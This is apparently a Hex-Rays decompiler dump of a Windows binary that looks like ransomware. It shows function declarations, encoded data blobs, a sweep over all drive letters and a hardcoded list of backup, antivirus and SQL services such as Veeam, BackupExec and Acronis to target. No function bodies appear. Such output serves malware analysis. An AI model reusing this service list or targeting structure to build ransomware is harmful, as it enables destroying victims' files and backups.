/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: GNU C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 __fastcall sub_140001000(int (__cdecl *a1)(struct _exception *));
__int64 __fastcall sub_140001110(__int64 a1, __int64 a2);
void __fastcall __noreturn start(void (__stdcall *a1)(DWORD dwMilliseconds), __int64 a2, __int64 a3, double a4, double a5, double a6, double a7, double a8, double a9, __m128 a10);
void __fastcall __noreturn sub_140001180(void (__stdcall *a1)(DWORD dwMilliseconds), double a2, double a3, double a4, double a5, double a6, double a7, __m128 a8, __int64 a9, __int64 a10);
void __fastcall __noreturn sub_140001440(void (__stdcall *a1)(DWORD dwMilliseconds), __int64 a2, __int64 a3, double a4, double a5, double a6, double a7, double a8, double a9, __m128 a10);
__int64 __fastcall sub_140001460(int (__cdecl *a1)());
__int64 __fastcall nullsub_1(); // weak
__int64 __fastcall sub_140001490(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400014B7(__int64 a1, __int64 a2, __int16 a3, __int64 a4);
__int64 __fastcall sub_1400014E5(__int64 a1, __int64 a2, __int16 a3, __int64 a4);
void sub_140001513();
__int64 __fastcall sub_14000151A(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); // weak
__int64 __fastcall sub_140001526(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
struct _LIST_ENTRY *__fastcall sub_140001535(__int64 a1, __int64 a2, __int64 a3, __m64 *a4);
__int64 __fastcall sub_14000158E(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400015A6(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400015B3(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400015C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400015CD(__int64 a1, __int64 a2, unsigned __int64 a3, const void *a4, __int64 a5, __int64 a6, int a7, int a8, int a9, int a10, __int64 a11, __int64 a12);
__int64 __fastcall sub_140001620(__int64 a1, __int64 a2);
BOOL __fastcall sub_140001C90(HMODULE a1);
void sub_140001D90();
void __fastcall __noreturn sub_140001E00(int (__cdecl *a1)(), double a2, double a3, double a4, double a5, double a6, double a7, __m128 a8);
void (*sub_140001E40())(void);
__int64 __fastcall sub_140001E90(int (__cdecl *a1)());
void __fastcall sub_140001EF0(int (__cdecl *a1)());
__int64 sub_140001F70(void); // weak
__int64 __fastcall TlsCallback_0(struct _RTL_CRITICAL_SECTION *a1, __int64 a2, int a3);
__int64 __fastcall TlsCallback_1(struct _RTL_CRITICAL_SECTION *a1, __int64 a2, int a3);
__int64 __fastcall sub_140002020(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
void sub_1400020C0();
void __fastcall sub_1400020D0(__int64 a1, __int64 a2);
void *__fastcall sub_1400023B0(unsigned __int64 a1, __int64 a2, __int64 a3, struct _MEMORY_BASIC_INFORMATION *a4);
void __fastcall __noreturn sub_140002550(FILE *a1, __int64 a2, __int64 a3, char *a4);
__int64 (__fastcall *__fastcall sub_1400025C0(__int64 a1, __int64 a2, __int64 a3, int a4, double a5, double a6, double a7, double a8, __int64 a9, __int64 a10, int a11, int a12, int a13, int a14, __int64 a15))(_QWORD, _QWORD, _QWORD, _QWORD);
void __fastcall sub_140002600(_UserMathErrorFunctionPointer UserMathErrorFunction, __int64 a2, __int64 a3, __int64 (__fastcall *a4)(_QWORD, _QWORD, _QWORD, _QWORD));
__int64 __fastcall sub_140002970(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, _BYTE *a5, char **a6, int a7, int a8, int a9, int a10, _QWORD *a11, unsigned int a12);
__int64 __fastcall sub_1400029C0(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, __int64 a5, _BYTE *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, char **a11, _QWORD *a12, unsigned int Size);
__int64 __fastcall sub_140002B90(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, _QWORD *a6, int a7, int a8, int a9, int a10, __int64 *a11, unsigned int a12);
__int64 __fastcall sub_140002BE0(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, __int64 a5, _WORD *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, _QWORD *a11, __int64 *a12, unsigned int Size);
__int64 __fastcall sub_140002DC0(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, _BYTE *a5, char **a6, int a7, int a8, int a9, int a10, _QWORD *a11, unsigned int a12);
__int64 __fastcall sub_140002E30(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, _QWORD *a6, int a7, int a8, int a9, int a10, _QWORD *a11, unsigned int a12);
__int64 __fastcall sub_140002EB0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, unsigned __int64 a6);
__int64 __fastcall sub_140002F40(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_1400030D0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, unsigned __int64 a6);
__int64 __fastcall sub_1400031F0(__int64 a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, _BYTE *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, _QWORD *a11, __int64 *a12, unsigned int a13);
__int64 __fastcall sub_140003240(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, _BYTE *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, unsigned __int64 a11, _QWORD *a12, __int64 *a13, unsigned int Size);
__int64 __fastcall sub_140003450(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, _QWORD *a11, __int64 *a12, unsigned int a13);
__int64 __fastcall sub_1400034B0(__int64 a1, __int64 a2, __int64 a3, _WORD *a4, __int64 a5, _WORD *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, unsigned __int64 a11, _QWORD *a12, __int64 *a13, unsigned int Size);
__int64 __fastcall sub_1400036C0(__int64 a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, _BYTE *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, _QWORD *a11, _QWORD *a12, unsigned int a13);
__int64 __fastcall sub_140003740(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, _QWORD *a11, _QWORD *a12, unsigned int a13);
__int64 __fastcall sub_140003A60(__int64 a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, _BYTE *a5, _QWORD *a6, int a7, int a8, int a9, int a10, __int64 *a11, unsigned int a12);
__int64 __fastcall sub_140003AB0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, _BYTE *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, _QWORD *a11, __int64 *a12, unsigned int Size);
__int64 __fastcall sub_140003D80(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, _QWORD *a6, int a7, int a8, int a9, int a10, _QWORD *a11, unsigned int a12);
__int64 __fastcall sub_140003DD0(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, __int64 a5, _WORD *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, _QWORD *a11, _QWORD *a12, unsigned int Size);
__int64 __fastcall sub_140003FC0(__int64 a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, _BYTE *a5, _QWORD *a6, int a7, int a8, int a9, int a10, _QWORD *a11, unsigned int a12);
__int64 __fastcall sub_140004030(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, _QWORD *a6, int a7, int a8, int a9, int a10, _QWORD *a11, unsigned int a12);
__int64 __fastcall sub_1400040C0(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_140004160(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_140004320(__int64 a1, __int64 a2, __int64 a3, _BYTE *a4, __int64 a5, __int64 a6);
__int64 __fastcall sub_140004460(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, _BYTE *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, char **a11, _QWORD *a12, unsigned int a13);
__int64 __fastcall sub_1400044B0(__int64 a1, __int64 a2, __int64 a3, char *a4, __int64 a5, _BYTE *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, unsigned __int64 a11, char **a12, _QWORD *a13, unsigned int Size);
__int64 __fastcall sub_1400046C0(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, _QWORD *a11, _QWORD *a12, unsigned int a13);
__int64 __fastcall sub_140004720(__int64 a1, __int64 a2, __int64 a3, _WORD *a4, __int64 a5, _WORD *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, unsigned __int64 a11, _QWORD *a12, _QWORD *a13, unsigned int Size);
__int64 __fastcall sub_140004950(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, _BYTE *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, char **a11, _QWORD *a12, unsigned int a13);
__int64 __fastcall sub_1400049D0(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _WORD *a5, unsigned __int64 a6, int a7, int a8, int a9, int a10, _QWORD *a11, _QWORD *a12, unsigned int a13);
__int64 __fastcall sub_140004A70(__int64 a1, __int64 a2, __int64 a3, char *a4);
__int64 __fastcall sub_140004AC0(__int64 a1, __int64 a2, __int64 a3, char *a4);
__int64 __fastcall sub_140004B10(__int64 a1, __int64 a2, size_t a3, wchar_t *a4);
__int64 __fastcall sub_140004B70(__int64 a1, __int64 a2, size_t a3, wchar_t *a4);
__int64 __fastcall sub_140004BD0(__int64 a1, __int64 a2, __int64 a3, char *a4);
__int64 __fastcall sub_140004C20(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4);
__int64 __fastcall sub_140004C80(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4);
__int64 __fastcall sub_140004CF0(__int64 a1, __int64 a2, size_t a3, wchar_t *a4);
__int64 __fastcall sub_140004D70(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4);
__int64 __fastcall sub_140004DE0(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4);
__int64 __fastcall sub_140004E60(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, char **a5, __int64 *a6, int a7, int a8, int a9, int a10, unsigned int a11, _BYTE *a12);
__int64 __fastcall sub_140004EC0(__int64 a1, __int64 a2, __int64 a3, char *a4, __int64 a5, char **a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, __int64 *a11, unsigned int Size, _BYTE *a13);
__int64 __fastcall sub_140005090(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4, wchar_t **a5, __int64 *a6, int a7, int a8, int a9, int a10, unsigned int a11, _WORD *a12, char a13);
__int64 __fastcall sub_1400050F0(__int64 a1, __int64 a2, __int64 a3, wchar_t *a4, __int64 a5, wchar_t **a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, __int64 *a11, unsigned int Size, _WORD *a13);
__int64 __fastcall sub_1400052D0(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, char **a5, _QWORD *a6, int a7, int a8, int a9, int a10, unsigned int a11, _BYTE *a12, char a13);
__int64 __fastcall sub_140005360(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4, wchar_t **a5, _QWORD *a6, int a7, int a8, int a9, int a10, unsigned int a11, _WORD *a12, char a13);
__int64 __fastcall sub_140005400(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, char **a5, __int64 *a6, int a7, int a8, int a9, int a10, unsigned int a11, _BYTE *a12);
__int64 __fastcall sub_140005450(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4, wchar_t **a5, __int64 *a6, int a7, int a8, int a9, int a10, unsigned int a11, _WORD *a12);
__int64 __fastcall sub_1400054A0(__int64 a1, __int64 a2, unsigned __int64 a3, char *a4, char **a5, _QWORD *a6, int a7, int a8, int a9, int a10, unsigned int a11, _BYTE *a12);
__int64 __fastcall sub_140005520(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4, wchar_t **a5, _QWORD *a6, int a7, int a8, int a9, int a10, unsigned int a11, _WORD *a12);
__int64 __fastcall sub_1400055C0(__int64 a1, __int64 a2, FILE *a3, _BYTE *a4);
__int64 __fastcall sub_140005650(int a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, __int64 a5, _QWORD *a6, int a7, int a8, int a9, int a10, __int64 *a11, size_t Size);
__int64 __fastcall sub_140005830(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4);
__int64 __fastcall sub_1400058D0(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, __int64 a5, _QWORD *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, unsigned __int64 *a11, unsigned int Size);
__int64 __fastcall sub_140005AC0(__int64 a1, __int64 a2, FILE *a3, _BYTE *a4);
__int64 __fastcall sub_140005B50(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4);
__int64 __fastcall sub_140005BF0(int a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, _QWORD *a5, __int64 *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, int a11);
__int64 __fastcall sub_140005C30(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _QWORD *a5, unsigned __int64 *a6, int a7, int a8, int a9, int a10, unsigned int a11);
__int64 __fastcall sub_140005C70(int a1, __int64 a2, unsigned __int64 a3, _BYTE *a4, _QWORD *a5, __int64 *a6, __int64 a7, __int64 a8, __int64 a9, __int64 a10, int a11);
__int64 __fastcall sub_140005CE0(__int64 a1, __int64 a2, unsigned __int64 a3, _WORD *a4, _QWORD *a5, _QWORD *a6, int a7, int a8, int a9, int a10, unsigned int a11);
__int64 __fastcall sub_140005F20(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 sub_140005F30(); // weak
char *sub_140005F40();
__int64 __fastcall sub_140005F50(_QWORD, _QWORD); // weak
__int64 __fastcall sub_140005F60(_QWORD, _QWORD); // weak
__int64 __fastcall sub_140005F70(size_t a1, __int64 a2, __int64 a3, int a4);
__int64 __fastcall sub_140005FF0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4);
__int64 __fastcall sub_140006080(LPCRITICAL_SECTION j, __int64 a2, int a3);
FILE *__fastcall sub_140006230(__int64 a1, __int64 a2, __int64 a3, int a4);
const char *__fastcall sub_1400062E0(const char *a1, __int64 a2, __int64 a3, const char *a4);
__int64 __fastcall sub_140006370(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 sub_1400063E0(void); // weak
void *sub_140006490();
char *__fastcall sub_140006550(__int64 a1, __int64 a2, __int64 a3, int a4);
unsigned __int64 __fastcall sub_140006614(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char a7);
int __fastcall Z17_e3cc5b58c71c8439Pw(double a1, double a2, double a3, double a4, double a5, double a6, __m128 a7, __int64 a8, __int64 a9, __int64 a10, const WCHAR *a11);
int __fastcall Z16fe7bb5bd884a4b05PKw(WCHAR *a1, __int64 a2, __int64 a3, __int64 a4, double a5, double a6, double a7, double a8, double a9, double a10, __m128 a11);
int __fastcall Z16d813fb2f7e16258aPw(WCHAR *a1, double a2, double a3, double a4, double a5, double a6, double a7, __m128 a8, __int64 a9, __int64 a10, struct _RTL_CRITICAL_SECTION *a11);
void __fastcall __noreturn sub_140007E26(double a1, double a2, double a3, double a4, double a5, double a6, __m128 a7, __int64 a8, __int64 a9, __int64 a10, __int64 a11);
DWORD __fastcall Z16fbddd3ee5768b27aP13_NETRESOURCEW(WCHAR *a1, __int64 a2, double a3, double a4, double a5, double a6, double a7, double a8, __m128 a9);
DWORD __fastcall Z16d2816ea60753364fPKw(__int64 a1, __int64 a2, __int64 a3, DWORD a4);
int __fastcall Z17_da736ccd2972c524w(double a1, double a2, double a3, double a4, double a5, double a6, __m128 a7, __int64 a8, __int64 a9, __int64 a10, unsigned int a11);
void __fastcall __noreturn Z12initCallbackPw(HCRYPTPROV a1, const WCHAR *a2, double a3, double a4, double a5, double a6, double a7, double a8, __m128 a9);
void __fastcall __noreturn sub_140008781(HCRYPTPROV a1, const WCHAR *a2, double a3, double a4, double a5, double a6, double a7, double a8, __m128 a9);
LPVOID __fastcall sub_14000878B(__int64 a1, __int64 a2, __int64 a3, int a4);
void __fastcall sub_1400087C3(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140008827(__int64 a1, __int64 a2, struct _RTL_CRITICAL_SECTION *a3, __int64 a4, int a5);
struct _RTL_CRITICAL_SECTION *__fastcall sub_140008900(__int64 a1, __int64 a2, int a3, __int64 a4, struct _RTL_CRITICAL_SECTION *a5);
_WORD *__fastcall sub_14000898B(__int64 a1, __int64 a2, __int64 a3, int a4, _WORD *a5);
int Z17_d58e476eea38c127v();
__int64 __fastcall sub_140008B64(CHAR *a1, const CHAR *a2);
__int64 (__fastcall *__fastcall Z17_a94acad879016c13v(HMODULE a1, const CHAR *a2))(HMODULE, const CHAR *, __int64, __int64);
int __fastcall Z17_f748c24884dd5699v(const CHAR *a1);
__int64 __fastcall sub_1400090D5(int (__cdecl *a1)(const wchar_t *String1, const wchar_t *String2), DWORD a2);
void __fastcall __noreturn sub_140009170(__int64 a1, BOOL (__stdcall *a2)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect));
BOOL __fastcall Z17_c32ef15adecfbcf9v(int (__stdcall *a1)(LPCWSTR lpString1, LPCWSTR lpString2), DWORD a2);
void *__fastcall sub_1400093C1(__int64 a1, __int64 a2, char *a3, _DWORD *a4, unsigned int a5);
__int64 __fastcall sub_14000A0C7(double a1, double a2, double a3, double a4, double a5, double a6, __m128 a7, __int64 a8, __int64 a9, const __m128i *a10, _WORD *a11, unsigned __int16 *a12);
__int64 __fastcall sub_14000B10A(__int64 a1, __int64 a2, int *a3, _QWORD *a4, int *a5);
__int64 __fastcall sub_14000B6F9(__int64 a1, __int64 a2, __int64 a3, __int64 *a4);
__int64 __fastcall sub_14000B7B5(__int64 a1, __int64 a2, __int64 a3, __int64 *a4);
__int64 __fastcall sub_14000B867(__int64 a1, __int64 a2, int *a3, __int64 a4);
__int64 __fastcall sub_14000BB67(__int64 a1, __int64 a2, int *a3, __int64 a4, int *a5);
int *__fastcall sub_14000BBC9(__int64 a1, __int64 a2, int *a3, _DWORD *a4);
__int64 __fastcall sub_14000C600(__int64 a1, __int64 a2, _DWORD *a3, _DWORD *a4, int *a5, unsigned int a6);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);
// DWORD __stdcall NetShareEnum(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// DWORD __stdcall WNetGetConnectionW(LPCWSTR lpLocalName, LPWSTR lpRemoteName, LPDWORD lpnLength);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// BOOL __stdcall Module32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// BOOL __stdcall Module32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// __int64 __fastcall _getmainargs(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD, _QWORD); weak
// void __cdecl _set_app_type(_crt_app_type Type);
// __int64 __fastcall amsg_exit(_QWORD, _QWORD, _QWORD, _QWORD); weak
// void __cdecl initterm(_PVFV *First, _PVFV *Last);
// _onexit_t __cdecl onexit(_onexit_t Func);
// void *__cdecl malloc(size_t Size);
// void *__cdecl memcpy(void *, const void *Src, size_t Size);
// void *__cdecl memset(void *, int Val, size_t Size);
// size_t __cdecl strlen(const char *Str);
// int fprintf(FILE *const Stream, const char *const Format, ...);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int __cdecl vfprintf(FILE *const Stream, const char *const Format, va_list ArgList);
// void __cdecl __noreturn abort();
// void __cdecl _setusermatherr(_UserMathErrorFunctionPointer UserMathErrorFunction);
// int __cdecl vsnprintf(char *const Buffer, const size_t BufferCount, const char *const Format, va_list ArgList);
// int __cdecl vsnwprintf(wchar_t *Buffer, size_t BufferCount, const wchar_t *Format, va_list Args);
// int __cdecl getc(FILE *Stream);
// wint_t __cdecl fgetwc(FILE *Stream);
// int __cdecl getpid();
// void *__cdecl calloc(size_t Count, size_t Size);
// void __cdecl free(void *Block);
// FILE *__cdecl _iob_func();
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);

//-------------------------------------------------------------------------
// Data declarations

void *off_14000D010 = (void *)0x140000000LL; // weak
const FILE Stream =
{
  (char *)0x206E776F6E6B6E55LL,
  1869771365,
  (char *)0x2928727265687461LL,
  1931812922,
  544106784,
  623407909,
  622865511,
  (char *)0x7465722820202967LL
}; // idb
const FILE stru_14000D346 =
{
  (char *)0x36772D77676E694DLL,
  1970413620,
  (char *)0x72756C6961662065LL,
  670309,
  0,
  -396361728,
  81920,
  (char *)0x14000E8600000LL
}; // idb
_UNKNOWN unk_14000D378; // weak
_UNKNOWN unk_14000D37A; // weak
__int128 xmmword_14000D3A0 = 0x74687279686568686571676D6E757864LL; // weak
__int128 xmmword_14000D3B0 = 0x6F6C62637271787A7672776875777978LL; // weak
__int128 xmmword_14000D3C0 = 0x76687667766676657664766376627661LL; // weak
__int128 xmmword_14000D3D0 = 0x76677603761D7601764D7606760C7603LL; // weak
__int128 xmmword_14000D3E0 = 0x7603760776167617761576427602764FLL; // weak
__int128 xmmword_14000D3F0 = 0x764F760B761576097645760476007605LL; // weak
__int128 xmmword_14000D400 = 0x76047656761076007616761E76147614LL; // weak
__int128 xmmword_14000D410 = 0x7650765E760E760B7614761E76187610LL; // weak
__int128 xmmword_14000D420 = 0x76EE76F376F476AB76A376EE76ED76E1LL; // weak
__int128 xmmword_14000D430 = 9LL; // weak
__int128 xmmword_14000D440 = 0LL; // weak
wchar_t *off_14000D830[26] =
{
  L"Q:\\",
  L"W:\\",
  L"E:\\",
  L"R:\\",
  L"T:\\",
  L"Y:\\",
  L"U:\\",
  L"I:\\",
  L"O:\\",
  L"P:\\",
  L"A:\\",
  L"S:\\",
  L"D:\\",
  L"F:\\",
  L"G:\\",
  L"H:\\",
  L"J:\\",
  L"K:\\",
  L"L:\\",
  L"Z:\\",
  L"X:\\",
  L"C:\\",
  L"V:\\",
  L"B:\\",
  L"N:\\",
  L"M:\\"
}; // weak
char *off_14000DA40[26] =
{
  "GxCVD",
  "BackupExecJobEngine",
  "BackupExecDiveciMediaService",
  "BackupExecVSSProvider",
  "SavRoam",
  "BackupExecAgentBrowser",
  "ccSetMgr",
  "stc_raw_agent",
  "ccEvtMgr",
  "DefWatch",
  "GxVss",
  "BackupExecManagementService",
  "BackupExecAgentAccelerator",
  "AcronisAgent",
  "VeeamDeploymentService",
  "VeeamNFSSvc",
  "GxBlr",
  "GxFWD",
  "BackupExecRPCService",
  "VeeamTransportSvc",
  "VSNAPVSS",
  "AcrSch2Svc",
  "GxCIMgr",
  "PDVFSService",
  "sql",
  "RTVscan"
}; // weak
void *off_14000DC80 = (void *)0x14000DDDELL; // weak
const SIZE_T NumberOfBytesWritten = 5764607523034248632uLL; // idb
_UNKNOWN SHA512_Constants_14000E1A0; // weak
_UNKNOWN SHA256_Constants_14000E420; // weak
_DWORD dword_14000E460[1] = { 0 }; // weak
_UNKNOWN unk_14000E8C8; // weak
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern HANDLE (__stdcall *CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern HANDLE (__stdcall *CreateSemaphoreA)(LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCSTR lpName);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern LPWSTR (__stdcall *GetCommandLineW)();
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern BOOL (__stdcall *GetFileSizeEx)(HANDLE hFile, PLARGE_INTEGER lpFileSize);
// extern DWORD (__stdcall *GetLastError)();
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern DWORD (__stdcall *GetProcessId)(HANDLE Process);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern void (__stdcall *GetSystemInfo)(LPSYSTEM_INFO lpSystemInfo);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *MoveFileExW)(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, DWORD dwFlags);
// extern HANDLE (__stdcall *OpenMutexA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCSTR lpName);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern BOOL (__stdcall *SetFileAttributesW)(LPCWSTR lpFileName, DWORD dwFileAttributes);
// extern BOOL (__stdcall *SetFilePointerEx)(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod);
// extern BOOL (__stdcall *SetProcessShutdownParameters)(DWORD dwLevel, DWORD dwFlags);
